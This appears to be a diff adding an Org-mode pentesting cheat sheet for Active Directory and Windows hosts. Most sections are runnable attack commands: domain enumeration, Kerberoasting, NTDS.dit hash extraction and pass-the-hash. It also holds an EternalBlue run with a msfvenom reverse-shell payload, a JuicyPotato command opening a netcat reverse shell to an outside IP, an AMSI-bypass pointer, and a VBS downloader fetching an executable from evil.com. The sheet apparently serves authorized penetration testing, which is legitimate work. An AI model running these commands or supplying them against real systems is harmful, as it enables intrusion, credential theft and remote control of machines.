@@ -1,0 +1,249 @@
+#+TITLE: Pentesting Active Directory forests of BSOD boxes
+#+INCLUDE: ../../../templates/rtfsg.org
+
+* General Resources
+*** Active Directory
+
+- [[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology][Active Directory Methodology]] by [[https://book.hacktricks.xyz/welcome/readme][Hacktricks]]
+- [[https://github.com/swisskyrepo/PayloadsAllTheThings][PayloadsAllTheThings]] with [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md][Active Directory Attacks]]
+- [[https://www.ultimatewindowssecurity.com/][Ultimate Windows Security]]
+- [[https://wadcoms.github.io/][wadcoms]]
+- [[https://www.thehacker.recipes/][The Hacker Recipes]]
+- [[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a][Kerberos cheatsheet]] by [[https://www.tarlogic.com/][Tarlogic]]
+- [[https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png][AD pentesting mind map]] by [[https://twitter.com/m4yfly/][m4yfly]]
+- [[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993][Powerview cheatsheet]] by [[https://blog.harmj0y.net/][harmj0y]]
+
+* Initial discovery and enumeration
+*** NetBios scan
+
+#+begin_src sh
+sudo nbtscan -v -s : -r 10.10.10.0/24
+#+end_src
+
+*** Find domain controllers
+
+Get the hostnames and ip addresses of DCs (Domain Controllers).
+
+#+begin_src shell
+C:> ipconfig /all # Look for DNS entries
+C:> nslookup <domain>
+# Or
+C:> nslookup
+> set type=all
+> _ldap._tcp.dc._msdcs.EXAMPLEDOMAIN
+#+end_src
+
+*** Active Directory enumeration
+***** Bloodhound
+
+[[https://github.com/BloodHoundAD/BloodHound][BloodHound]] ([[https://bloodhound.readthedocs.io/en/latest/index.html][docs]]) allows to find and visualize paths in the Active Directory
+structure. First use an ingestor such as [[https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors][SharpHound]] (.exe or .ps1) or
+[[https://github.com/fox-it/BloodHound.py][BloodHound.py]] and feed the collected data into BloodHound's Neo4j database.
+The importing can be automated with [[https://github.com/fox-it/bloodhound-import][bloodhound-import]].
+
+#+begin_src sh
+bloodhound-python -c All -u <user> -p <passwd> -d <domain>
+bloodhound-import -du neo4j -dp <passwd> *.json
+bloodhound
+#+end_src
+
+***** Bloodhound queries
+
+#+begin_example
+# Accounts able to perform RBCD
+# Source: https://twitter.com/KenjiEndo15/status/1578811281498599425
+Match p=(g)-[:AddAllowedToAct|WriteAccountRestrictions]->(c:Computer) RETURN p
+#+end_example
+
+***** PingCastle
+
+[[https://www.pingcastle.com/][PingCastle]] by [[https://twitter.com/mysmartlogon][Vincent Le Toux]] is a Windows executable that will assess the
+most important security mis-configurations related to the Active Directory
+environment. Among its nifty features you can find AD objects graph
+visualisation and clear HTML reports.
+
+***** Manual queries
+
+[[https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=597cb251d175][Manually quering with dsquery and ldapsearch]].
+
+*** Local enumeration
+
+General system info and config.
+
+#+begin_src shell
+C:\> systeminfo
+C:\> netsh firewall show state
+C:\> netsh firewall show config
+C:\> wmic os list brief
+C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
+C:\> net share
+C:\> wmic useraccount
+#+end_src
+
+#+begin_src powershell
+PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft
+PS C:\> Get-Service | ? {$_.Status -eq "Running"}
+PS C:\> Get-MpComputerStatus | findstr "True"
+PS C:\> Get-WmiObject win32_useraccount
+#+end_src
+
+Search file names or directory names recursively with =dir /s=, find
+text in files with =findstr=.
+
+#+begin_src shell
+C:\> dir /s *passw*
+C:\> findstr /si passw *.txt
+#+end_src
+
+Look for unquoted Service Paths
+
+#+begin_src shell
+C:\> wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
+C:\> sc qc <service> # Check for quotes and spaces in BINARY_PATH_NAME
+#+end_src
+
+*** Powershell
+
+#+begin_src shell
+PS C:\> Get-ExecutionPolicy -List
+PS C:\> Set-ExecutionPolicy Bypass -Scope Process
+#+end_src
+
+*** Services
+
+#+begin_src powershell
+PS C:\> Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
+#+end_src
+
+*** Sysinternals
+
+#+begin_src shell
+C:\> \\live.sysinternals.com\tools\procdump.exe -accepteula
+#+end_src
+
+*** Responder
+
+When working on a Windows/AD environment, it is never a bad idea to have
+[[https://github.com/lgandx/Responder][Responder]] running in the background. It is a wonderful and extremely
+featureful tool, I highly recommend that you check out its documentation.
+
+* Privilege escalation
+*** Enumeration
+
+Resources:
+- [[https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation][HackTricks]] with a [[https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation][checklist]].
+
+
+Tools:
+- [[https://github.com/itm4n/PrivescCheck][PrivescCheck]] by [[https://github.com/itm4n][itm4n]]: Powershell script.
+- [[https://github.com/Tib3rius/windowsprivchecker][windowsprivchecker]] by [[https://tib3rius.com/][Tib3rius]]: Batch script.
+
+*** NTDS.dit extraction
+
+The NTDS.dit file is located on Domain Controllers and contains the password
+hashes of Active Directory users. There are various ways to extract them:
+
+- With local administrator access as described by [[https://www.ultimatewindowssecurity.com/blog/default.aspx?d=10/2017][Ultimate Windows Security]]
+  (Volume Shadow Copy Service (VSS), Ntdsutil.exe, PowerSploit NinjaCopy).
+
+- Remotely via SMB with [[https://github.com/byt3bl33d3r/CrackMapExec][CrackMapExec]]:
+
+  #+begin_src shell
+$ cme smb -u Administrator -p Password123 --ntdis (drsuapi|vss) <target>
+  #+end_src
+
+  Once that the hashes are retrieved they can either be used 'as-is' (with
+  pass-the-hash attacks for example, see below) or cracked to retrieve the
+  plaintext user passwords.
+
+*** Kerberoasting
+
+Look for roastable accounts:
+
+#+begin_src shell
+GetUserSPNs.py -request -dc-ip 10.10.10.10 <domain>/<user>:<passwd>
+#+end_src
+
+*** SMB shares
+
+#+begin_src sh
+cme smb <domain> -u <user> -p <passwd> --shares
+#+end_src
+
+*** Abuse GenericAll and GeneralWrite
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#genericall
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#genericwrite
+
+*** Pass-the-hash
+
+By using [[https://github.com/SecureAuthCorp/impacket][Impacket]]'s *psexec*:
+
+#+begin_src shell
+$ python examples/psexec.py -hashes '<hash here>' username@10.1.2.3
+#+end_src
+
+*** MS17-010 - EternalBlue
+
+Metasploit or external scripts, for example from [[https://github.com/helviojunior/MS17-010][helviojunior]].
+
+#+begin_src sh
+git clone https://github.com/helviojunior/MS17-010.git
+cd MS17-010
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=7766 -f exe > eternalblue.exe
+python2 send_and_execute.py <target> eternalblue.exe
+#+end_src
+
+*** JuicyPotato
+
+[[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato][Hacktricks on JuicyPotato]]. Check this [[https://ohpe.it/juicy-potato/CLSID/][Windows CLSID list]] if needed, use [[https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1][this
+script]] to extract all CLSIDs.
+
+Here we spawn a netcat reverse shell with administrator privileges.
+
+#+begin_src sh
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\nc.exe -e cmd.exe 192.168.119.132 8443" -t *
+#+end_src
+
+* AMSI
+
+- [[https://amsi.fail/][AMSI.fail]]: Generate Powershell snippets to disable AMSI for the current
+  process.
+
+* Windows Defender
+*** List excluded paths
+
+#+begin_src shell
+reg query "HKLM\Software\Microsoft\Windows Defender\Exclusions\Paths"
+#+end_src
+
+* Misc
+*** Remove password from Excel spreadsheet
+
+A simple way to remove the password from protected cells is to unzip the
+spreadsheet, locate and remove the hash of the password and rezip.
+
+#+begin_src sh
+7z x Protected.xlsx
+sed -i -e 's/<sheetProtection.*\/>//g' xl/worksheets/sheet2.xml
+7z a Unprotected.xlsx .
+libreoffice Unprotected.xlsx
+#+end_src
+
+*** VBS snippets
+***** File download
+
+Uses /Microsoft.XMLHTTP/ to download and save a file locally.
+
+#+begin_src VBS
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "http://www.evil.com/legit.exe", False
+xHttp.Send
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile "C:\Users\Public\legit.exe", 2
+end with
+#+end_src
